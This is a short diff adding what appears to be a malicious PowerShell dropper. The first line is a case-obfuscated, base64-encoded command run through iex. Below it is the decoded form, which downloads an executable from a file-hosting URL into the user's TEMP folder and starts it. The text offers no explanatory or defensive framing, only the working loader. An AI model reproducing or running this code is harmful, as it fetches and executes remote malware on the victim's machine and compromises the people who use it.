@@ -1,0 +1,7 @@
+iex([sysTEm.TExt.eNCOdInG]::Utf8.GeTstRiNg([SYSTem.COnVERt]::froMbAse64STRING('CihOZXctT2JqZWN0IHN5U1RFbS5uRVQud2ViY0xJRU50KS5ET3duTG9BREZpTEUoJ2h0dHBzOi8vYS5wb21mLmNhdC9rbGNrY3AuZXhlJywiJEVuVjpURU1QXGNlZGVyXzAxMS5leGUiKTtTdGFydC1Qcm9jZXNzICgiJEVuVjpURU1QXGNlZGVyXzAxMS5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySTEm.nET.webcLIENt).DOwnLoADFiLE('https://a.pomf.cat/klckcp.exe',"$EnV:TEMP\ceder_011.exe");Start-Process ("$EnV:TEMP\ceder_011.exe")
+
